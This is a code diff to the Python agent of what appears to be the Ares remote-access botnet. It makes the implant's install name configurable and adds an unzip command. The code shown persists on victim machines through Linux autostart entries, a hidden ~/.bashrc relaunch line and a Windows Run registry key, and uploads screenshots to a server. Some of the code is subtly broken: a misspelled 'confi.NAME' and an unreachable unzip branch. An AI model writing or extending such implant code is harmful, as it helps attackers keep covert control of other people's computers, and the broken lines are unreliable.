@@ -47,9 +47,9 @@ class Agent(object):
     def get_install_dir(self):
         install_dir = None
         if platform.system() == 'Linux':
-            install_dir = self.expand_path('~/.ares')
+            install_dir = self.expand_path('~/.'+config.NAME)
         elif platform.system() == 'Windows':
-            install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            install_dir = os.path.join(os.getenv('USERPROFILE'), config.NAME)
         if os.path.exists(install_dir):
             return install_dir
         else:
@@ -191,44 +191,45 @@ class Agent(object):
             self.send_output('[!] Agent seems to be already installed.')
             return
         if platform.system() == 'Linux':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.'+config.NAME)
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             os.system('chmod +x ' + agent_path)
             if os.path.exists(self.expand_path("~/.config/autostart/")):
-                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
-                with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
+                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName="+config.NAME+"\nExec=%s\n" % agent_path
+                with open(self.expand_path('~/.config/autostart/'+config.NAME+'.desktop'), 'w') as f:
                     f.write(desktop_entry)
             else:
                 with open(self.expand_path("~/.bashrc"), "a") as f:
                     f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+
         elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            persist_dir = os.path.join(os.getenv('USERPROFILE'),config.NAME)
             if not os.path.exists(persist_dir):
                 os.makedirs(persist_dir)
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v "+config.NAME+" /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
         self.send_output('[+] Agent installed.')
 
     def clean(self):
         """ Uninstalls the agent """ 
         if platform.system() == 'Linux':
-            persist_dir = self.expand_path('~/.ares')
+            persist_dir = self.expand_path('~/.'+config.NAME)
             if os.path.exists(persist_dir):
                 shutil.rmtree(persist_dir)
-            desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
+            desktop_entry = self.expand_path('~/.config/autostart/'+confi.NAME+'.desktop')
             if os.path.exists(desktop_entry):
                 os.remove(desktop_entry)
-            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
+            os.system("grep -v ."+config.NAME+" .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
         elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
-            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), config.NAME)
+            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v "+config.NAME
             subprocess.Popen(cmd, shell=True)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v "+config.NAME+" /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
         self.send_output('[+] Agent removed successfully.')
 
@@ -259,7 +260,25 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-   
+            
+    @threaded
+    def extract_zip(self,zip_name,destination=""):
+        """ Unzips a zip file in the current directory """
+        try:
+            zip_name = self.expand_path(zip_name)
+            if not os.path.exists(zip_name):
+                self.send_output("[+] No such zip file: %s"% zip_name)
+                return
+            if destination=="":
+                destination = os.path.dirname(zip_name)
+            self.send_output("[*] Starting zip extraction...")
+            zip_file = zipfile.ZipFile(zip_name)
+            zip_file.extractall(destination)
+            zip_file.close()
+            self.send_output("[+] Extracted archive: %s" % zip_name)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
@@ -323,6 +342,13 @@ class Agent(object):
                             self.persist()
                         elif command == 'exit':
                             self.exit()
+                        elif command == "unzip":
+                            if not args or len(args) < 2:
+                                self.send_output("usage: unzip <archive_name> <destination> or unzip <archive_name>")
+                            elif len(args) == 1:
+                                self.extract_zip(" ".join(args))
+                            else:
+                                self.extract_zip(args[0]," ".join(args[1:]))
                         elif command == 'zip':
                             if not args or len(args) < 2:
                                 self.send_output('usage: zip <archive_name> <folder>')
